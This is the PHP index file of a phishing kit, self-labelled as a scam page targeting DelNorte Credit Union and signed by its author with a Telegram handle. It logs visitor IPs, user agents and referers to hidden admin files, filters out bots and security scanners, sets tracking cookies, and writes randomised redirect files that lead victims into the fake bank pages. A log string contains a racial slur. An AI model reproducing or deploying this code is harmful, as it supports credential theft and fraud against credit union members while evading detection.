<?php
//<!-- SCAM PAGE DelNorteCU #By YOCHI, WORK HARD DREAM B!G --> 
 /* ___      ___      _______  __
	\  \    /  /     /  _____||  |
	 \  \  /  /	    /  /	  |  |
	  \  \/  /	   |  |		  |  |___    O
	   \    /____  |  |       |   ___ \	 _
		|  |/_ _ \ |  |       |  |   \ || |
        |  | o_o  | \  \____  |  |   | || |
		|__|\____/   \______| |__|   |_||_|     grrrr
	Telegram : @yo_chi
									   */
session_start();
date_default_timezone_set('America/New_York');
$dt=date('d M Y H:i:s');
function getip(){$client  = @$_SERVER['HTTP_CLIENT_IP'];$cf  = @$_SERVER['HTTP_CF_CONNECTING_IP'];$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];$remote  = $_SERVER['REMOTE_ADDR'];if(filter_var($client, FILTER_VALIDATE_IP)){return $client;} elseif(filter_var($cf, FILTER_VALIDATE_IP)){return $cf;} elseif(filter_var($forward, FILTER_VALIDATE_IP)){return $forward;} else{return $remote;};};
if(isset($_SERVER['HTTP_REFERER'])){$rf = $_SERVER['HTTP_REFERER'];} else{$rf = 'NOT REFERED';};
$ib="--------| VIS!T0R|--------
IP = ".getip().'
USER-AGENT = '.$_SERVER['HTTP_USER_AGENT'].'
HOST ADDR = '.gethostbyaddr(getip()).'
REFERER = '.$rf.'
DATETIME = '.$dt.'

';
$_SESSION['homedir']=__DIR__;
$mile = fopen("admin/yo.txt","a");
fwrite($mile,$ib);
fclose($mile);
$filedir='admin/db.json';
$ud=file_get_contents($filedir);
$udarray = json_decode($ud,true);
foreach($udarray as $key=>$value){$narr[$key]=$value;};
$ip = getip();
if(!in_array($ip,$narr['visits'])){
array_push($narr['visits'],$ip);
array_push($narr['humans'],$ip);
file_put_contents($filedir,json_encode($narr));};
$d=dirname($_SERVER['PHP_SELF']);
if($d != '\\' && $d != '/'){$isshell=__DIR__;};
include('btm.php');
if(isset($_GET['continue'])){if(!empty($_SESSION['c_page_']) && !empty($_SESSION['fldr'])){header("location:".$_SESSION['fldr']."/".$_SESSION['indexfile']."?".genv(gonext($_SESSION['c_page_']))."=".md5(rand(10, 9999))."&".md5('somerandomshit'.uniqid())."=".md5(uniqid()));exit();};};
$_SESSION['dbvar']=!empty($_SESSION['dbvar'])?$_SESSION['dbvar']:strtolower(substr(md5(uniqid().'db') , -6));
$_SESSION['sshh']=!empty($_SESSION['sshh'])?$_SESSION['sshh']:strtolower(substr(md5(uniqid().'height') , -5));
$_SESSION['ssww']=!empty($_SESSION['ssww'])?$_SESSION['ssww']:strtolower(substr(md5(uniqid().'width') , -5));
if (!isset($timecookie)){logbot('SAD LIFE NIGGA');banbot();exit();};
setcookie($timecookie,$timecookievalue,time()+86400*30,'/');
setcookie($bottime,time(),time()+86400*30,'/');
$_SESSION['indexfile']=substr(md5($_SERVER['HTTP_HOST'].'yochithegreatloner') , -4);
$redc="<?php include 'dir.php';?>";
$redname=substr(md5($_SERVER['HTTP_HOST']) , -4);
if(!file_exists($redname.".php")){
$red = fopen($redname.".php","w");
fwrite($red,$redc);
fclose($red);};
header('location:'.$redname);
?>